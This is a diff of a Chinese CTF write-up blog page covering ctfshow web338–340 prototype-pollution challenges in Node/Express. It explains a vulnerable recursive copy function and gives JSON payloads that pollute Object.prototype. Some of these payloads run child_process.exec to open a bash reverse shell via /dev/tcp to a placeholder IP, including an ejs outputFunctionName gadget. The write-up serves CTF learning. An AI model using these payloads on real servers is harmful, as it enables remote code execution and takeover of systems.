&#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//utils/common.js</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">copy</span>:copy</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>要让<code>secert.ctfshow===&#39;36dboy&#39;</code>，就会输出flag。</p>
 <p>调用了copy函数：<code>utils.copy(user,req.body);</code>，可以与链接文章里面的merge函数类比。<br>登录的时候抓包，修改post的内容：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Json"><div class="codebox"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;ctfshow&quot;</span><span class="punctuation">:</span><span class="string">&quot;36dboy&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>原理：</p>
 <p>我们看copy函数，<code>object1</code>是<code>user</code>，它的定义是<code>let user = &#123;&#125;;</code> ，就是一个空对象。</p>
@@ -343,56 +94,31 @@ module<span class="token punctuation">.</span>exports <span class="token operato
 <p>第一次循环<code>key</code>是<code>__proto__</code> ，因为每一个对象都有<code>__proto__</code>属性，所以判断为TRUE，然后递归调用copy函数。<br>这次传参，<code>object1</code> 是<code>object1[&#39;__proto__&#39;]</code> ，就是<code>Object&#123;……&#125;</code>，回溯到了Object类了，<br><code>object2</code>是<code>object2[&#39;__proto__&#39;]</code> ，就是<code>&#123; ctfshow: &quot;36dboy&quot; &#125;</code> 。</p>
 <p>此时<code>key</code>为<code>ctfshow</code>。因为Object没有ctfshow这个变量，所以经过判断为FALSE，进入else，执行<code>object1[&#39;ctfshow&#39;] = object2[&#39;ctfshow&#39;]</code> 。将Object类的ctfshow的值改为了<code>36dboy</code> ，那么所有继承object类的类都会有属性ctfshow&#x3D;36dboy，也就是所有类，因为所有类都是object的子类。</p>
 <p><code>var secert = &#123;&#125;;</code> secert被污染，也拥有属性ctfshow&#x3D;36dboy。</p>
-<pre class="line-numbers language-none"><code class="language-none">if(secert.ctfshow&#x3D;&#x3D;&#x3D;&#39;36dboy&#39;)&#123;
-   res.end(flag);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Scss"><div class="codebox"><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">if</span>(secert.ctfshow===&#x27;<span class="number">36</span>dboy&#x27;)&#123;</span><br><span class="line">   res<span class="selector-class">.end</span>(flag);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>判断为真，所以输出flag</p>
 <h1><span id="web339-原型链污染">web339 原型链污染</span></h1><p>和上一题的区别是：</p>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Js"><div class="codebox"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===flag)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>flag我们是不知道的，这里不能利用。但是还是可以通过copy函数进行原型链污染。</p>
 <p>比上一题多了一个api.js：</p>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment">/* GET home page.  */</span>
-router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'api'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">query</span><span class="token operator">:</span> <span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-   
-<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Js"><div class="codebox"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>关键看：</p>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js">res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'api'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">query</span><span class="token operator">:</span> <span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Js"><div class="codebox"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function">Function - JavaScript | MDN (mozilla.org)</a></p>
 <p>JS 的函数实际上都是一个 <code>Function</code> 对象，它的参数为</p>
-<pre class="line-numbers language-none"><code class="language-none">new Function ([arg1[, arg2[, ...argN]],] functionBody)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Ada"><div class="codebox"><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="keyword">Function</span> <span class="title"></span>([arg1[, arg2[, ...argN]],] functionBody)</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><code>Function</code> 对象传入构造函数里的第一个是函数的形参，可以省略，第二个参数是函数体。</p>
 <p>写个小demo</p>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-  <span class="token punctuation">&#125;</span>
- <span class="token keyword">var</span> user <span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
- body<span class="token operator">=</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"__proto__":&#123;"query":"return 123"&#125;&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
- <span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
- console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Js"><div class="codebox"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">var</span> user =&#123;&#125;</span><br><span class="line"> body=<span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return 123&quot;&#125;&#125;&#x27;</span>);</span><br><span class="line"> <span class="title function_">copy</span>(user,body);</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Function</span>(query)(query));</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>控制台输出123。因为<code>Function</code>函数体就是<code>return 123</code>。</p>
 <p>所以思路就是我们先通过copy函数污染query的值，然后访问&#x2F;api触发。</p>
 <p>PAYLOAD：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;端口 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Haxe"><div class="codebox"><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:<span class="type"></span>&#123;<span class="string">&quot;query&quot;</span>:<span class="type"></span>&quot;<span class="keyword">return</span> global.process.mainModule.constructor._load(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/端口 0&gt;&amp;1\&quot;&#x27;</span>)<span class="string">&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><code>global.process.mainModule.constructor._load(&#39;child_process&#39;).exec()</code>是运用的前面的RCE的知识。</p>
 <p>其实是相当于<code>require(&#39;child_process&#39;).exec()</code>，但是require不是全局的。</p>
@@ -403,213 +129,159 @@ module<span class="token punctuation">.</span>exports <span class="token operato
 <p><code>bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/端口 0&gt;&amp;1\&quot;</code> 反弹shell。之所以要套2层bash，就是本地测试，发现一层bash的话会报错。</p>
 <p>非预期解：</p>
 <p>这题用了ejs模板引擎，这个模板引擎有个漏洞可以rce：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;xxx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Haxe"><div class="codebox"><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:<span class="type"></span>&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="type"></span>&quot;_tmp1;global.process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1\&quot;&#x27;</span>);<span class="keyword">var</span> __tmp2<span class="string">&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h1><span id="web340-原型链污染">web340 原型链污染</span></h1><p>和上一题差不多，只不过这里不一样：</p>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-  <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-  <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
-  <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
-  <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>     
-  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>isAdmin<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
- res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
- <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
